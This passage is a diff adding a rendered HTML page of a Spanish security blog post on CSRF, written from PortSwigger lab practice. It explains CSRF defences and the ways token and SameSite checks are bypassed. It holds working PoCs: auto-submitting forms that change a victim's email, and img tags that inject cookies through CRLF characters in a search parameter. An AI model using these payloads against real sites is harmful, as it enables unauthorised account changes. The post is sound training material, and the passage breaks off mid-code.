@@ -1,0 +1,565 @@
+<!DOCTYPE html>
+<html lang="es">
+    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <title>Cross Site Request Forgery (CSRF) - AntuSec</title><meta name="Description" content="Blog de AntuSec, articulos sobre ctfs y ciberseguridad"><meta property="og:url" content="http://localhost:1313/es/csrf/">
+  <meta property="og:site_name" content="AntuSec">
+  <meta property="og:title" content="Cross Site Request Forgery (CSRF)">
+  <meta property="og:description" content="Introducción En este articulo se va a explicar a modo resumen en que consiste la vulnerabilidad web Cross Site Request Forguery (CSRF) y algunas técnicas de como explotarla en diferentes entornos.
+Para la redacción de este articulo me he basado en los laboratorios de portswigger que he realizado para la preparación de su certificación BSCP.
+Definición Esta vulnerabilidad consiste en llevar a cabo acciones por parte de un usuario sin su consentimiento ni conocimiento como puede ser un cambio de correo dentro de una web a través de un link malicioso generado por el atacante, aprovechándose de una mala configuración de la web vulnerable, que enviara al usuario.">
+  <meta property="og:locale" content="es">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2025-05-01T00:00:00+00:00">
+    <meta property="article:modified_time" content="2025-11-02T11:24:09+02:00">
+    <meta property="article:tag" content="BSCP">
+    <meta property="article:tag" content="Web">
+    <meta property="article:tag" content="Pentesting">
+    <meta property="article:tag" content="Csrf">
+    <meta property="og:image" content="http://localhost:1313/es/csrf/preimagen.jpeg">
+
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:image" content="http://localhost:1313/es/csrf/preimagen.jpeg">
+  <meta name="twitter:title" content="Cross Site Request Forgery (CSRF)">
+  <meta name="twitter:description" content="Introducción En este articulo se va a explicar a modo resumen en que consiste la vulnerabilidad web Cross Site Request Forguery (CSRF) y algunas técnicas de como explotarla en diferentes entornos.
+Para la redacción de este articulo me he basado en los laboratorios de portswigger que he realizado para la preparación de su certificación BSCP.
+Definición Esta vulnerabilidad consiste en llevar a cabo acciones por parte de un usuario sin su consentimiento ni conocimiento como puede ser un cambio de correo dentro de una web a través de un link malicioso generado por el atacante, aprovechándose de una mala configuración de la web vulnerable, que enviara al usuario.">
+<meta name="application-name" content="AntuSec">
+<meta name="apple-mobile-web-app-title" content="AntuSec">
+<meta name="referrer" content="no-referrer" /><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="http://localhost:1313/es/csrf/" /><link rel="prev" href="http://localhost:1313/es/agentec2/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/css/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="/lib/fontawesome-free/css/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "Cross Site Request Forgery (CSRF)",
+        "inLanguage": "es",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "http:\/\/localhost:1313\/es\/csrf\/"
+        },"image": [{
+                            "@type": "ImageObject",
+                            "url": "http:\/\/localhost:1313\/es\/csrf\/preimagen.jpeg",
+                            "width":  317 ,
+                            "height":  159 
+                        }],"genre": "posts","keywords": "BSCP, Web, Pentesting, Csrf","wordcount":  1858 ,
+        "url": "http:\/\/localhost:1313\/es\/csrf\/","datePublished": "2025-05-01T00:00:00+00:00","dateModified": "2025-11-02T11:24:09+02:00","license": "This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.","publisher": {
+            "@type": "Organization",
+            "name": "xxxx","logo": {
+                    "@type": "ImageObject",
+                    "url": "http:\/\/localhost:1313\/images\/avatar.png",
+                    "width":  398 ,
+                    "height":  292 
+                }},"author": {
+                "@type": "Person",
+                "name": "Antu"
+            },"description": ""
+    }
+    </script></head>
+    <body data-header-desktop="fixed" data-header-mobile="auto"><script>
+          const query = window.matchMedia('(prefers-color-scheme: dark)');
+          function applyTheme() {
+            let theme = window.localStorage?.getItem('theme') || 'auto';
+            let isDark = theme === 'dark' || (theme === 'auto' && query.matches);
+            document.body.setAttribute('theme', isDark? 'dark' : 'light');
+            document.body.setAttribute('cfg-theme', theme);
+          }
+
+          applyTheme();
+          query.addEventListener('change', applyTheme);
+        </script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/es/" title="AntuSec">AntuSec</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/es/posts/"> Publicaciones </a><a class="menu-item" href="/es/tags/"> Etiquetas </a><a class="menu-item" href="/es/categories/"> Categorias </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="Busca títulos o contenido..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Buscar">
+                            <i class="fas fa-search" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Limpiar">
+                            <i class="fas fa-times-circle" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="Cambia el tema">
+                    <i class="fas fa-adjust" aria-hidden="true"></i>
+                </a><a href="javascript:void(0);" class="menu-item language" title="Selecciona el lenguage">
+                    <i class="fa fa-globe" aria-hidden="true"></i>
+                    <select class="language-select" id="language-select-desktop" onchange="location = this.value;"><option value="/es/csrf/" selected>Español</option></select>
+                </a></div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/es/" title="AntuSec">AntuSec</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="Busca títulos o contenido..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Buscar">
+                            <i class="fas fa-search" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Limpiar">
+                            <i class="fas fa-times-circle" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        Cancelar
+                    </a>
+                </div><a class="menu-item" href="/es/posts/" title="">Publicaciones</a><a class="menu-item" href="/es/tags/" title="">Etiquetas</a><a class="menu-item" href="/es/categories/" title="">Categorias</a><a href="javascript:void(0);" class="menu-item theme-switch" title="Cambia el tema">
+                <i class="fas fa-adjust" aria-hidden="true"></i>
+            </a><a href="javascript:void(0);" class="menu-item" title="Selecciona el lenguage">
+                    <i class="fa fa-globe" aria-hidden="true"></i>
+                    <select class="language-select" onchange="location = this.value;"><option value="/es/csrf/" selected>Español</option></select>
+                </a></div>
+    </div>
+</header><div class="search-dropdown desktop">
+        <div id="search-dropdown-desktop"></div>
+    </div>
+    <div class="search-dropdown mobile">
+        <div id="search-dropdown-mobile"></div>
+    </div><main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">Contenido</h2>
+            <div class="toc-content always-active" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">Cross Site Request Forgery (CSRF)</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="/es/" title="Author" rel="author" class="author"><i class="fas fa-user-circle" aria-hidden="true"></i>Antu</a></span>&nbsp;<span class="post-category">incluido en <a href="/es/categories/red-team/"><i class="far fa-folder" aria-hidden="true"></i>Red Team</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt" aria-hidden="true"></i>&nbsp;<time datetime="2025-05-01">2025-05-01</time>&nbsp;<i class="fas fa-pencil-alt" aria-hidden="true"></i>&nbsp;1858 palabras&nbsp;
+                <i class="far fa-clock" aria-hidden="true"></i>&nbsp;9 minutos&nbsp;</div>
+        </div><div class="featured-image"><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/es/csrf/preimagen.jpeg"
+        data-srcset="/es/csrf/preimagen.jpeg, /es/csrf/preimagen.jpeg 1.5x, /es/csrf/preimagen.jpeg 2x"
+        data-sizes="auto"
+        alt="/es/csrf/preimagen.jpeg"
+        title="/es/csrf/preimagen.jpeg" /></div><div class="details toc" id="toc-static"  data-kept="">
+                <div class="details-summary toc-title">
+                    <span>Contenido</span>
+                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#introducción">Introducción</a></li>
+    <li><a href="#definición">Definición</a></li>
+    <li><a href="#condiciones-que-se-deben-cumplir">Condiciones que se deben cumplir</a></li>
+    <li><a href="#medidas-comunes-contra-csrf">Medidas comunes contra CSRF</a></li>
+    <li><a href="#métodos-para-eludir-el-csrf-token">Métodos para eludir el CSRF token</a>
+      <ul>
+        <li><a href="#la-validación-del-csrf-token-depende-del-método-de-la-petición">La validación del CSRF Token depende del método de la petición</a></li>
+        <li><a href="#la-validación-de-csrf-token-depende-de-si-esta-presente">La validación de CSRF Token depende de si esta presente</a></li>
+        <li><a href="#el-csrf-token-no-esta-vinculado-a-la-sesión">El CSRF token no esta vinculado a la sesión</a></li>
+        <li><a href="#el-csrf-token-esta-vinculado-a-una-cookie-distinta-a-la-de-sesión">El CSRF Token esta vinculado a una cookie distinta a la de sesión</a></li>
+        <li><a href="#csrf-token-duplicado-en-la-cookie">CSRF token duplicado en la cookie.</a></li>
+      </ul>
+    </li>
+    <li><a href="#samesite-cookie">Samesite cookie</a>
+      <ul>
+        <li><a href="#strict">Strict</a></li>
+        <li><a href="#lax">Lax</a></li>
+        <li><a href="#none">None</a></li>
+      </ul>
+    </li>
+    <li><a href="#lax-bypass">Lax bypass</a>
+      <ul>
+        <li><a href="#solución-laboratorio-bypassing-samesite-lax-restrictions-using-get-requests">Solución laboratorio Bypassing SameSite Lax restrictions using GET requests</a></li>
+        <li><a href="#solución-al-laboratorio-con-refresco-de-cookie">Solución al laboratorio con refresco de cookie</a></li>
+      </ul>
+    </li>
+    <li><a href="#strict-bypass">Strict bypass</a>
+      <ul>
+        <li><a href="#same-site-sibling-domaincswsh">Same site Sibling domain(CSWSH)</a></li>
+      </ul>
+    </li>
+    <li><a href="#bypass-referer-header">Bypass referer header</a></li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><h2 id="introducción">Introducción</h2>
+<p>En este articulo se va a explicar a modo resumen en que consiste la vulnerabilidad web Cross Site Request Forguery (CSRF) y algunas técnicas de como explotarla en diferentes entornos.</p>
+<p>Para la redacción de este articulo me he basado en los laboratorios de <a href="https://portswigger.net/" target="_blank" rel="noopener noreffer ">portswigger</a> que he realizado para la preparación de su certificación BSCP.</p>
+<h2 id="definición">Definición</h2>
+<p>Esta vulnerabilidad consiste en llevar a cabo acciones por parte de un usuario sin su consentimiento ni conocimiento como puede ser un cambio de correo dentro de una web a través de un link malicioso generado por el atacante, aprovechándose de una mala configuración de la web vulnerable, que enviara al usuario.</p>
+<h2 id="condiciones-que-se-deben-cumplir">Condiciones que se deben cumplir</h2>
+<p>Para que sea posible la explotación se deben cumplir tres claves:</p>
+<ol>
+<li>Debe haber una acción que el atacante induzca al usuario a realizar, como por ejemplo un cambio de contraseña o de correo.</li>
+<li>Manejo de sesiones basado en cookies: solo debe haber cookies de sesión para identificar el usuario y la acción debe de llevarse a cabo a través de una o mas peticiones http, tampoco debe haber mecanismos de seguimiento de sesiones o validaciones de peticiones.</li>
+<li>No debe haber parámetros impredecibles por ejemplo en un cambio de contraseña no debe de estar el campo de contraseña actual ya que no deberíamos de conocerla</li>
+</ol>
+<p>El siguiente código es una POC en el que se realiza un cambio de correo en una web sin ningún tipo de restricción.</p>
+<p>Se debe obtener la ruta en el que se realiza la acción. (En este ejemplo es <strong>/my-account/change-email</strong>) y cambiar los parámetros que se envían en la petición por los que el atacante quiera cambiar.</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copiar al portapapeles"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">&lt;html&gt;
+</span></span><span class="line"><span class="cl">    &lt;body&gt;
+</span></span><span class="line"><span class="cl">        &lt;form <span class="nv">action</span><span class="o">=</span><span class="s2">&#34;https://URL-VULNERABLE/my-account/change-email&#34;</span> <span class="nv">method</span><span class="o">=</span><span class="s2">&#34;POST&#34;</span> &gt;
+</span></span><span class="line"><span class="cl">            &lt;input <span class="nv">type</span><span class="o">=</span><span class="s2">&#34;hidden&#34;</span> <span class="nv">name</span><span class="o">=</span><span class="s2">&#34;email&#34;</span> <span class="nv">value</span><span class="o">=</span><span class="s2">&#34;antu97@test.com&#34;</span> /&gt;
+</span></span><span class="line"><span class="cl">        &lt;/form&gt;
+</span></span><span class="line"><span class="cl">        &lt;script&gt;
+</span></span><span class="line"><span class="cl">      document.forms<span class="o">[</span>0<span class="o">]</span>.submit<span class="o">()</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    &lt;/script&gt;
+</span></span><span class="line"><span class="cl">    &lt;/body&gt;
+</span></span><span class="line"><span class="cl">&lt;/html&gt;</span></span></code></pre></div></div>
+<p>Una forma sencilla de generar un exploit CSRF es utilizando la opción de ‘CSRF PoC generator’ de Burpsuite Pro.</p>
+<h2 id="medidas-comunes-contra-csrf">Medidas comunes contra CSRF</h2>
+<p>Las medidas mas comunes para defenderse contra los ataques CSRF son:</p>
+<ul>
+<li>
+<p><strong>CSRF tokens:</strong> Es una cadena de caracteres alfanuméricos cuyo valor es secreto, único e impredecible la cual es generada por el lado del servidor y enviada al cliente. Cuando un cliente realiza acciones sensibles como el envió de un formulario, el cliente debe incluir un CSRF token valido en la petición de lo contrario el servidor rechazara la petición y la acción no se llevara a cabo.</p>
+<p>Si esta bien implementado un CSRF token es una buena medida para defenderse de los ataques CSRF ya que hace muy difícil de predecir por parte del atacante el valor de este para incluirlo en la petición maliciosa.</p>
+</li>
+<li>
+<p><strong>SameSite cookies:</strong> Es un atributo que poseen las cookies que indican al explorador si la cookie se debe utilizar para el contexto entre sitios o solo para el contexto del mismo sitio.</p>
+<p>Las peticiones en acciones sensibles dentro de una web suelen ir con una cookie de autenticación de sesión, si esta cookie tiene configurada un SameSite apropiado evitara que un atacante realice dicha acción entre sitios. Desde el 2021 por defecto el navegador Chrome fuerza a que las cookies tengan el valor Lax en el atributo SameSite.</p>
+</li>
+<li>
+<p><strong>Referer-based validation:</strong> Algunas aplicaciones web utilizan  la cabecera Referer para defenderse contra ataques CSRF, esta cabecera se utiliza para que la petición que se realiza provenga de un origen determinado normalmente de aplicaciones dentro de la propio dominio.</p>
+<p>Esta medida es menos efectiva que el CSRF token.</p>
+</li>
+</ul>
+<h2 id="métodos-para-eludir-el-csrf-token">Métodos para eludir el CSRF token</h2>
+<h3 id="la-validación-del-csrf-token-depende-del-método-de-la-petición">La validación del CSRF Token depende del método de la petición</h3>
+<p>Algunas aplicaciones solo validan los CSRF-token en peticiones POST y no en las peticiones GET</p>
+<p>Cambiando el método a GET y añadiendo los parámetros en la url se puede eludir la validación del csrf Token</p>
+<p>Laboratorio  <a href="https://portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-validation-depends-on-request-method" target="_blank" rel="noopener noreffer ">aquí</a>.</p>
+<h3 id="la-validación-de-csrf-token-depende-de-si-esta-presente">La validación de CSRF Token depende de si esta presente</h3>
+<p>Algunas aplicaciones solo validan el csrf token cuando esta presente si lo eliminamos completamente puede que no se haga dicha validación, para comprobarlo basta con realizar la petición sin el parámetro del token y observar si se realiza con éxito.</p>
+<p>Laboratorio <a href="https://portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-validation-depends-on-token-being-present" target="_blank" rel="noopener noreffer ">aquí</a>.</p>
+<h3 id="el-csrf-token-no-esta-vinculado-a-la-sesión">El CSRF token no esta vinculado a la sesión</h3>
+<p>Se puede dar el caso que el token no este vinculado a la sesión y exista una lista de tokens validos, por lo que se puede utilizar el token de la sesión del atacante para explotar la vulnerabilidad.</p>
+<p>Una PoC podría ser la siguiente:</p>
+<div class="code-block code-line-numbers" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copiar al portapapeles"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">&lt;html&gt;
+</span></span><span class="line"><span class="cl">    &lt;body&gt;
+</span></span><span class="line"><span class="cl">        &lt;form <span class="nv">action</span><span class="o">=</span><span class="s2">&#34;https://URL-Vulnerable/my-account/change-email&#34;</span> <span class="nv">method</span><span class="o">=</span><span class="s2">&#34;POST&#34;</span> &gt;
+</span></span><span class="line"><span class="cl">            &lt;input <span class="nv">type</span><span class="o">=</span><span class="s2">&#34;hidden&#34;</span> <span class="nv">name</span><span class="o">=</span><span class="s2">&#34;email&#34;</span> <span class="nv">value</span><span class="o">=</span><span class="s2">&#34;antu97@test.com&#34;</span> /&gt;
+</span></span><span class="line"><span class="cl">            &lt;input <span class="nv">type</span><span class="o">=</span><span class="s2">&#34;hidden&#34;</span> <span class="nv">name</span><span class="o">=</span><span class="s2">&#34;csrf&#34;</span> <span class="nv">value</span><span class="o">=</span><span class="s2">&#34;Token del atacante&#34;</span> /&gt;
+</span></span><span class="line"><span class="cl">        &lt;/form&gt;
+</span></span><span class="line"><span class="cl">        &lt;script&gt;
+</span></span><span class="line"><span class="cl">      document.forms<span class="o">[</span>0<span class="o">]</span>.submit<span class="o">()</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    &lt;/script&gt;
+</span></span><span class="line"><span class="cl">    &lt;/body&gt;
+</span></span><span class="line"><span class="cl">&lt;/html&gt;</span></span></code></pre></div></div>
+<p>Laboratorio  <a href="https://portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-not-tied-to-user-session" target="_blank" rel="noopener noreffer ">aquí</a>.</p>
+<h3 id="el-csrf-token-esta-vinculado-a-una-cookie-distinta-a-la-de-sesión">El CSRF Token esta vinculado a una cookie distinta a la de sesión</h3>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-jsx">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copiar al portapapeles"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-jsx" data-lang="jsx"><span class="line"><span class="cl"><span class="nx">POST</span> <span class="o">/</span><span class="nx">email</span><span class="o">/</span><span class="nx">change</span> <span class="nx">HTTP</span><span class="o">/</span><span class="mf">1.1</span>
+</span></span><span class="line"><span class="cl"><span class="nx">Host</span><span class="o">:</span> <span class="nx">vulnerable</span><span class="o">-</span><span class="nx">website</span><span class="p">.</span><span class="nx">com</span>
+</span></span><span class="line"><span class="cl"><span class="nx">Content</span><span class="o">-</span><span class="nx">Type</span><span class="o">:</span> <span class="nx">application</span><span class="o">/</span><span class="nx">x</span><span class="o">-</span><span class="nx">www</span><span class="o">-</span><span class="nx">form</span><span class="o">-</span><span class="nx">urlencoded</span>
+</span></span><span class="line"><span class="cl"><span class="nx">Content</span><span class="o">-</span><span class="nx">Length</span><span class="o">:</span> <span class="mi">68</span>
+</span></span><span class="line"><span class="cl"><span class="nx">Cookie</span><span class="o">:</span> <span class="nx">session</span><span class="o">=</span><span class="nx">pSJYSScWKpmC60LpFOAHKixuFuM4uXWF</span><span class="p">;</span> <span class="nx">csrfKey</span><span class="o">=</span><span class="nx">rZHCnSzEp8dbI6atzagGoSYyqJqTz5dv</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nx">csrf</span><span class="o">=</span><span class="nx">RhV7yQDO0xcq9gLEah2WVbmuFqyOq7tY</span><span class="o">&amp;</span><span class="nx">email</span><span class="o">=</span><span class="nx">test</span><span class="err">@</span><span class="nx">test</span><span class="p">.</span><span class="nx">com</span></span></span></code></pre></div></div>
+<p>Se puede dar el caso de que el token no esta ligado a la cookie que trackea la sesión y este ligada a otra(csrfkey). Para testear primero debemos probar:</p>
+<p>4.1 Comprobar que la cookie(csrfkey) no esta ligado al token</p>
+<ul>
+<li>Introducir un token no valido</li>
+<li>introducir un token de otro usuario</li>
+</ul>
+<p>4.2  Introducir una cookie(csrf Key) y token de otro usuario</p>
+<p>Si este ultimo se cumple para explotar la vulnerabilidad debemos inyectar la cookie en la sesión del usuario en este ejemplo a través del parámetro de búsqueda de la web ya que se ve reflejado en la respuesta.</p>
+<p>En esta PoC se utiliza el csrf y csrfkey del atacante para cambiar la del usuario</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copiar al portapapeles"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">&lt;html&gt;
+</span></span><span class="line"><span class="cl">  &lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;
+</span></span><span class="line"><span class="cl">  &lt;body&gt;
+</span></span><span class="line"><span class="cl">    &lt;form <span class="nv">action</span><span class="o">=</span><span class="s2">&#34;https://Url-Vulnerable/my-account/change-email&#34;</span> <span class="nv">method</span><span class="o">=</span><span class="s2">&#34;POST&#34;</span>&gt;
+</span></span><span class="line"><span class="cl">      &lt;input <span class="nv">type</span><span class="o">=</span><span class="s2">&#34;hidden&#34;</span> <span class="nv">name</span><span class="o">=</span><span class="s2">&#34;email&#34;</span> <span class="nv">value</span><span class="o">=</span><span class="s2">&#34;antu97@test&amp;#46;com&#34;</span> /&gt;
+</span></span><span class="line"><span class="cl">      &lt;input <span class="nv">type</span><span class="o">=</span><span class="s2">&#34;hidden&#34;</span> <span class="nv">name</span><span class="o">=</span><span class="s2">&#34;csrf&#34;</span> <span class="nv">value</span><span class="o">=</span><span class="s2">&#34;CSRF-ATACANTE&#34;</span> /&gt;
+</span></span><span class="line"><span class="cl">    &lt;/form&gt;
+</span></span><span class="line"><span class="cl">     &lt;img <span class="nv">src</span><span class="o">=</span><span class="s2">&#34;https://0acb008503ccb1858109de59003c0073.web-security-academy.net?search=test%0d%0aSet-Cookie:%20csrfKey=CSRFKEY-ATACANTE%3b%20SameSite=None&#34;</span> <span class="nv">onerror</span><span class="o">=</span><span class="s2">&#34;document.forms[0].submit()&#34;</span>&gt;
+</span></span><span class="line"><span class="cl">  &lt;/body&gt;
+</span></span><span class="line"><span class="cl">&lt;/html&gt;</span></span></code></pre></div></div>
+<p>Laboratorio <a href="https://portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-tied-to-non-session-cookie" target="_blank" rel="noopener noreffer ">aquí</a>.</p>
+<h3 id="csrf-token-duplicado-en-la-cookie">CSRF token duplicado en la cookie.</h3>
+<p>Se puede dar el caso que el token aparezca duplicado en la cookie y en el parámetro de la petición, cuando la petición se envía, la validación que realiza es que tanto el token de la petición y la cookie sean el mismo, para testear esta vulnerabilidad se debe cambiar el valor del token y la cookie por otro pero que sea el mismo y realizar la petición, si se realiza con éxito es explotable.</p>
+<p>Hay que encontrar una vía de inyectar la cookie en la sesión del cliente, en este ejemplo se inyecta a través del parámetro de búsqueda.</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/es/csrf/image.png"
+        data-srcset="/es/csrf/image.png, /es/csrf/image.png 1.5x, /es/csrf/image.png 2x"
+        data-sizes="auto"
+        alt="/es/csrf/image.png"
+        title="image" width="602" height="404" /></p>
+<p>Poc:</p>
+<div class="code-block code-line-numbers" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copiar al portapapeles"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">&lt;html&gt;
+</span></span><span class="line"><span class="cl">  &lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;
+</span></span><span class="line"><span class="cl">  &lt;body&gt;
+</span></span><span class="line"><span class="cl">    &lt;form <span class="nv">action</span><span class="o">=</span><span class="s2">&#34;https://URL-VULNERABLE/my-account/change-email&#34;</span> <span class="nv">method</span><span class="o">=</span><span class="s2">&#34;POST&#34;</span>&gt;
+</span></span><span class="line"><span class="cl">      &lt;input <span class="nv">type</span><span class="o">=</span><span class="s2">&#34;hidden&#34;</span> <span class="nv">name</span><span class="o">=</span><span class="s2">&#34;email&#34;</span> <span class="nv">value</span><span class="o">=</span><span class="s2">&#34;antu97@test.com&#34;</span> /&gt;
+</span></span><span class="line"><span class="cl">      &lt;input <span class="nv">type</span><span class="o">=</span><span class="s2">&#34;hidden&#34;</span> <span class="nv">name</span><span class="o">=</span><span class="s2">&#34;csrf&#34;</span> <span class="nv">value</span><span class="o">=</span><span class="s2">&#34;fake&#34;</span> /&gt;
+</span></span><span class="line"><span class="cl">     &lt;input <span class="nv">type</span><span class="o">=</span><span class="s2">&#34;submit&#34;</span> <span class="nv">value</span><span class="o">=</span><span class="s2">&#34;Submit request&#34;</span> /&gt;
+</span></span><span class="line"><span class="cl">    &lt;/form&gt;
+</span></span><span class="line"><span class="cl">      &lt;img <span class="nv">src</span><span class="o">=</span><span class="s2">&#34;https://0a480019035853b38352287c00700099.web-security-academy.net/?search=test4%0d%0aSet-Cookie:%20csrf=fake%3b%20SameSite=None&#34;</span> <span class="nv">onerror</span><span class="o">=</span><span class="s2">&#34;document.forms[0].submit()&#34;</span>&gt;
+</span></span><span class="line"><span class="cl">   
+</span></span><span class="line"><span class="cl">  &lt;/body&gt;
+</span></span><span class="line"><span class="cl">&lt;/html&gt;</span></span></code></pre></div></div>
+<p>Laboratorio <a href="https://portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-duplicated-in-cookie" target="_blank" rel="noopener noreffer ">aquí</a>.</p>
+<h2 id="samesite-cookie">Samesite cookie</h2>
+<p>Restricciones SameSite:</p>
+<ul>
+<li>Lax</li>
+<li>Strict</li>
+<li>None</li>
+</ul>
+<p>Ninguna de estas restricciones garantiza total inmunidad.</p>
+<p>Si no hay una restricción asociada a la cookie chrome utiliza Lax por defecto, lo que quiere decir que solo se enviara la cookie si cumple con un criterio.</p>
+<h3 id="strict">Strict</h3>
+<p>El sitio de la solicitud debe coincidir con el sitio que se muestra actualmente en la barra URL del navegador si no, la cookie no se va a enviar lo que quiere decir que la cookie no se envía entre sitios diferentes.</p>
+<h3 id="lax">Lax</h3>
+<p>Para que se envíe la cookie la solicitud debe cumplir los siguiente</p>
+<ul>
+<li>Utiliza método GET</li>
+<li>La solicitud se debe realizar por parte de un usuario(por ejemplo si la realiza un bot no se envia) como al hacer clic en un link</li>
+</ul>
+<h3 id="none">None</h3>
+<p>La cookie se envía en todas las solicitudes que se hagan.</p>
+<p>Si la cookie es configurada con el valor None se le debe añadir también el valor secure para que solo se envíe en conexiones https.</p>
+<h2 id="lax-bypass">Lax bypass</h2>
+<p>Provocando una petición Get desde el navegador de la victima se puede llevar a cabo un csrf</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-jsx">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copiar al portapapeles"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-jsx" data-lang="jsx"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span>
